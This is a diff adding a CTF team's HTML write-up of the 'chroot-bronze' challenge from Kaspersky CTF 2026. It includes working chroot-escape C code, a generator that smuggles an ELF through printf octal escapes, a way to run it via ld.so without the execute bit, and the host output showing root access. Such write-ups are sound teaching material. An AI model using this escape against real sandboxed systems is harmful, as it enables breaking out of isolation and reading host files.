@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>chroot-bronze · Kaspersky CTF 2026 writeup · NXT_CTFS</title>
+<meta name="description" content="Root inside a bare chroot. Ship an ELF with `printf` octal escapes, run it via `ld.so` to dodge the missing `+x`, then the classic `chroot`/`chdir(&quot;..&quot;)` walk-out." />
+<link rel="icon" href="../images/Logo-nobg.png" type="image/png" />
+<link rel="stylesheet" href="../css/fonts.css?v=2" />
+<link rel="stylesheet" href="../css/styles.css?v=16" />
+<script>document.documentElement.classList.add('js');</script>
+</head>
+<body>
+
+<div class="backdrop" aria-hidden="true"></div>
+<div class="gutters" aria-hidden="true"></div>
+
+<nav class="nav" id="nav">
+  <div class="container nav-inner">
+    <div class="nav-id">
+      <span class="nav-ws">[0]</span>
+      <a href="../index.html#top" class="brand">
+        <img src="../images/Logo-nobg.png" alt="NXT_CTFS logo" />
+        <span class="brand-name">NXT_CTFS</span>
+      </a>
+    </div>
+    <div class="nav-links">
+      <a href="../index.html#about">about</a>
+      <a href="../index.html#focus">categories</a>
+      <a href="../index.html#results">results</a>
+      <a href="../writeups.html" class="is-active">writeups</a>
+      <a href="../index.html#team">team</a>
+      <a href="../index.html#shell">challenge</a>
+      <a href="../index.html#join">join</a>
+    </div>
+    <div class="nav-cta">
+      <span class="nav-clock" id="navClock" aria-hidden="true">00:00:00</span>
+      <a href="../index.html#join" class="btn btn-secondary">Join us</a>
+      <button class="nav-toggle" id="navToggle" aria-label="Toggle menu" aria-expanded="false">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
+          <line x1="4" y1="7" x2="20" y2="7"></line>
+          <line x1="4" y1="12" x2="20" y2="12"></line>
+          <line x1="4" y1="17" x2="20" y2="17"></line>
+        </svg>
+      </button>
+    </div>
+  </div>
+  <div class="mobile-panel" id="mobilePanel">
+    <a href="../index.html#about">about</a>
+    <a href="../index.html#focus">categories</a>
+    <a href="../index.html#results">results</a>
+    <a href="../writeups.html">writeups</a>
+    <a href="../index.html#team">team</a>
+    <a href="../index.html#shell">challenge</a>
+    <a href="../index.html#join">join</a>
+  </div>
+</nav>
+
+<main class="wu-main container" id="top">
+  <div class="wu-crumbs"><a href="../index.html#top">nxt_ctfs</a> <span>/</span> <a href="../writeups.html">writeups</a> <span>/</span> <span>chroot-bronze</span></div>
+
+  <header class="wu-head">
+    <div class="wu-head-tags">
+      <span class="wu-cat wu-cat-misc">misc</span>
+      <span class="wu-pts">77 pts</span>
+      <span class="wu-when">solved Aug 29, 20:45</span>
+    </div>
+    <h1>chroot-bronze <span>chroot escape</span></h1>
+    <div class="wu-flagrow">
+      <span class="wu-flagrow-k">flag</span>
+      <code id="wuFlag">kaspersky{fb30b3a6-ff28-4698-b023-bfb73c4bbf63}</code>
+      <button type="button" class="wu-copy" data-copy="#wuFlag" aria-label="Copy flag">copy</button>
+    </div>
+  </header>
+
+  <div class="wu-layout">
+    <article class="wu-article">
+<ul>
+<li><strong>Task ID:</strong> 13</li>
+<li><strong>Type:</strong> <code>dynamic_docker</code> (personal instance)</li>
+<li><strong>Description:</strong> <em>&quot;Why do you need Docker when you have chroot?&quot;</em> - connect via TLS:<pre><code>openssl s_client -connect &lt;id&gt;.tcp.kit.sasc.tf:443 -servername &lt;id&gt;.tcp.kit.sasc.tf -quiet
+</code></pre>
+</li>
+</ul>
+<h2 id="tldr"><a class="wu-anchor" href="#tldr" aria-hidden="true">#</a>TL;DR</h2>
+<p>The service drops you into <code>/bin/sh</code> running <strong>as root</strong> inside a <code>chroot</code> jail.
+<code>chroot</code> is <em>not</em> a security boundary: a root process can escape it with the classic
+<code>mkdir</code> → <code>chroot(subdir)</code> → <code>chdir(&quot;..&quot;)*N</code> → <code>chroot(&quot;.&quot;)</code> trick. The flag lives on the
+real host filesystem outside the jail.</p>
+<h2 id="recon"><a class="wu-anchor" href="#recon" aria-hidden="true">#</a>Recon</h2>
+<p>Start the instance and connect:</p>
+<pre><code class="language-bash">/Users/dan/ctf/kaspersky/kasperskyinstance start 13 --wait
+# tcp://&lt;id&gt;.tcp.kit.sasc.tf:443
+</code></pre>
+<p>The shell is extremely bare - most commands are missing (<code>id</code>, <code>ls</code>, <code>uname</code>, <code>cat</code>,
+<code>head</code> are all &quot;not found&quot;). Only shell builtins work. Using globbing (<code>echo /*</code>) we map
+the entire jail:</p>
+<pre><code>/bin/sh
+/lib/x86_64-linux-gnu/libc.so.6
+/lib64/ld-linux-x86-64.so.2
+</code></pre>
+<ul>
+<li>No <code>/proc</code>, <code>/etc</code>, <code>/tmp</code>, <code>/home</code>, <code>/root</code>.</li>
+<li>No flag inside the jail → this is a <strong>chroot escape</strong> challenge.</li>
+</ul>
+<p>Key facts gathered with builtins only:</p>
+<ul>
+<li>The jail root <code>/</code> is <strong>writable</strong> (<code>printf hi &gt; /t</code> → <code>rc=0</code>).</li>
+<li>glibc version (execute the loader): <code>ld.so (Ubuntu GLIBC 2.43) … version 2.43</code>.</li>
+<li>Architecture: x86-64 (<code>ld-linux-x86-64.so.2</code>).</li>
+</ul>
+<h2 id="the-problem"><a class="wu-anchor" href="#the-problem" aria-hidden="true">#</a>The problem</h2>
+<p>The standard root chroot escape must run compiled code, but the jail has <strong>no compiler
+and no upload channel</strong>, and shell redirection cannot set the execute bit (so even root
+cannot <code>exec</code> a plain written file - root still needs at least one <code>x</code> bit).</p>
+<p>Two tricks solve both issues:</p>
+<ol>
+<li><strong>Run without the execute bit</strong> - invoke the ELF through the dynamic loader:
+<code>/lib64/ld-linux-x86-64.so.2 /e</code>. The loader maps the ELF as <em>data</em>, bypassing the
+missing <code>+x</code> permission.</li>
+<li><strong>Transfer without base64/upload</strong> - write the binary byte-by-byte with dash&#39;s
+<code>printf</code> using 3-digit octal escapes (<code>printf &#39;\177\105\114\106…&#39; &gt; /e</code>). Exactly 3
+octal digits per byte prevents adjacent escapes from merging.</li>
+</ol>
+<p>Because the jail glibc (2.43) is newer than the build host glibc (2.39), a normally
+dynamically-linked binary built on the host runs fine under the jail&#39;s libc
+(backward compatibility).</p>
+<h2 id="exploit"><a class="wu-anchor" href="#exploit" aria-hidden="true">#</a>Exploit</h2>
+<h3 id="1-escape-program-escapec"><a class="wu-anchor" href="#1-escape-program-escapec" aria-hidden="true">#</a>1. Escape program - <a href="escape.c"><code>escape.c</code></a></h3>
+<pre><code class="language-c">#include &lt;sys/stat.h&gt;
+#include &lt;unistd.h&gt;
+int main(void){
+    mkdir(&quot;.x&quot;, 0755);
+    chroot(&quot;.x&quot;);                     // cwd is now OUTSIDE the new root
+    for(int i=0;i&lt;256;i++) chdir(&quot;..&quot;); // walk up to the real /
+    chroot(&quot;.&quot;);                      // re-root at the real filesystem
+    char *args[] = {&quot;/bin/sh&quot;,&quot;-c&quot;,
+      &quot;PATH=/bin:/usr/bin:/sbin:/usr/sbin; echo ==WHOAMI==; id; &quot;
+      &quot;echo ==FINDFLAG==; ls -la /; cat /flag* 2&gt;/dev/null; &quot;
+      &quot;find / -maxdepth 3 -iname &#39;*flag*&#39; 2&gt;/dev/null &quot;
+      &quot;-exec echo {} \\; -exec cat {} \\;&quot;, NULL};
+    execv(&quot;/bin/sh&quot;, args);           // real host /bin/sh with coreutils
+    return 0;
+}
+</code></pre>
+<p>Why it works: after <code>chroot(&quot;.x&quot;)</code> the kernel changes the process root but leaves the
+current working directory unchanged - now the cwd sits <em>above</em> (outside) the new root.
+Repeated <code>chdir(&quot;..&quot;)</code> from an out-of-root cwd climbs all the way to the real <code>/</code>, and
+<code>chroot(&quot;.&quot;)</code> re-roots the process there.</p>
+<h3 id="2-build-on-x86-64-host-ssh-pwnbox"><a class="wu-anchor" href="#2-build-on-x86-64-host-ssh-pwnbox" aria-hidden="true">#</a>2. Build on x86-64 host (<code>ssh pwnbox</code>)</h3>
+<pre><code class="language-bash">gcc -O2 -o /tmp/escape /tmp/escape.c &amp;&amp; strip /tmp/escape
+# ELF 64-bit LSB pie executable, x86-64, dynamically linked
+</code></pre>
+<h3 id="3-generate-the-transferrun-payload"><a class="wu-anchor" href="#3-generate-the-transferrun-payload" aria-hidden="true">#</a>3. Generate the transfer+run payload</h3>
+<pre><code class="language-python">d = open(&quot;escape.bin&quot;, &quot;rb&quot;).read()
+esc = &quot;&quot;.join(&quot;\\%03o&quot; % b for b in d)  # 3-digit octal per byte
+cmd = &quot;printf &#39;&quot; + esc + &quot;&#39; &gt; /e\n/lib64/ld-linux-x86-64.so.2 /e\n&quot;
+open(&quot;payload.txt&quot;, &quot;w&quot;).write(cmd)
+</code></pre>
+<h3 id="4-fire-it-over-the-tls-shell"><a class="wu-anchor" href="#4-fire-it-over-the-tls-shell" aria-hidden="true">#</a>4. Fire it over the TLS shell</h3>
+<pre><code class="language-bash">cat payload.txt | openssl s_client \
+  -connect &lt;id&gt;.tcp.kit.sasc.tf:443 \
+  -servername &lt;id&gt;.tcp.kit.sasc.tf -quiet
+</code></pre>
+<h2 id="result"><a class="wu-anchor" href="#result" aria-hidden="true">#</a>Result</h2>
+<pre><code>==WHOAMI==
+uid=0(root) gid=0(root)
+==FINDFLAG==
+drwxr-xr-x  bin
+drwxr-xr-x  dev
+drwxr-xr-x  etc
+dr-xr-xr-x  proc
+drwxr-xr-x  root
+drwxr-xr-x  sbin
+dr-xr-xr-x  sys
+kaspersky{fb30b3a6-ff28-4698-b023-bfb73c4bbf63}
+</code></pre>
+<p>We are <code>uid=0</code> on the real host root filesystem (note the full <code>bin/dev/etc/proc/sys</code>
+tree that did not exist inside the jail), and <code>cat /flag*</code> prints the flag.</p>
+<h2 id="flag"><a class="wu-anchor" href="#flag" aria-hidden="true">#</a>Flag</h2>
+<pre><code>kaspersky{fb30b3a6-ff28-4698-b023-bfb73c4bbf63}
+</code></pre>
+<p>Submitted with:</p>
+<pre><code class="language-bash">/Users/dan/ctf/kaspersky/kasperskyflag 13 &#39;kaspersky{fb30b3a6-ff28-4698-b023-bfb73c4bbf63}&#39;
+# {&quot;status&quot;: &quot;Correct&quot;}
+</code></pre>
+<h2 id="artifacts"><a class="wu-anchor" href="#artifacts" aria-hidden="true">#</a>Artifacts</h2>
+<ul>
+<li><code>escape.c</code>, chroot-escape source</li>
+<li><code>escape.bin</code>, compiled x86-64 ELF (built on pwnbox)</li>
+<li><code>payload.txt</code>, <code>printf</code>-octal transfer + <code>ld.so</code> execution one-liner</li>
+<li><code>escape.b64</code> / <code>escape.bin</code>, intermediate build artifacts</li>
+</ul>
+<h2 id="takeaways"><a class="wu-anchor" href="#takeaways" aria-hidden="true">#</a>Takeaways</h2>
+<ul>
+<li><code>chroot</code> only changes the process root; it does <strong>not</strong> revoke <code>CAP_SYS_CHROOT</code> or
+reset the cwd, so a root process trivially escapes. It is an isolation convenience,
+not a security sandbox - hence <em>&quot;Why do you need Docker when you have chroot?&quot;</em>.</li>
+<li>Missing binaries in a jail are not a barrier: <code>printf</code> octal writes arbitrary bytes and
+<code>ld-linux.so &lt;file&gt;</code> executes non-<code>+x</code> ELFs.</li>
+</ul>
+
+    </article>
+    <nav class="wu-toc" aria-label="On this page">
+        <p class="wu-toc-h">On this page</p>
+        <ol><li><a href="#tldr">TL;DR</a></li><li><a href="#recon">Recon</a></li><li><a href="#the-problem">The problem</a></li><li><a href="#exploit">Exploit</a></li><li><a href="#result">Result</a></li><li><a href="#flag">Flag</a></li><li><a href="#artifacts">Artifacts</a></li><li><a href="#takeaways">Takeaways</a></li></ol>
+      </nav>
+  </div>
+
+  <nav class="wu-pager" aria-label="More writeups">
+    <a class="wu-pager-link wu-pager-prev" href="lumberjack.html"><span class="wu-pager-dir">&larr; Previous</span><span class="wu-pager-name">Lumberjack</span></a>
+    <a class="wu-pager-link wu-pager-next" href="awasmsafe.html"><span class="wu-pager-dir">Next &rarr;</span><span class="wu-pager-name">awasmsafe</span></a>
+  </nav>
+</main>
+
+<footer class="footer container">
+  <div class="footer-grid">
+    <div>
+      <a href="../index.html#top" class="footer-brand">
+        <img src="../images/Logo-nobg.png" alt="NXT_CTFS logo" />
+        <span>NXT_CTFS</span>
+      </a>
+      <p class="footer-tag">A team built around curiosity, persistence, and the occasional 3am breakthrough.</p>
+    </div>
+    <div class="footer-col">
+      <h4>Navigate</h4>
+      <a href="../index.html#about">About</a>
+      <a href="../index.html#focus">Categories</a>
+      <a href="../index.html#results">Results</a>
+      <a href="../writeups.html">Writeups</a>
+      <a href="../index.html#join">Join</a>
+    </div>
+    <div class="footer-col">
+      <h4>Connect</h4>
+      <a href="https://discord.gg/AnmfSNMvS" target="_blank" rel="noopener noreferrer">Discord</a>
+      <a href="https://github.com/HappyCPPD/NxT-s-Team-Library" target="_blank" rel="noopener noreferrer">GitHub</a>
+      <a href="https://ctftime.org/team/442864" target="_blank" rel="noopener noreferrer">CTFtime</a>
+    </div>
+  </div>
+  <div class="footer-bottom">
+    <span>&copy; 2026 NXT_CTFS. All rights reserved.</span>
+    <span class="footer-hint">Two flags on this page. One is in the sandbox.</span>
+  </div>
+</footer>
+
+<script src="../js/script.js?v=16"></script>
+</body>
+</html>
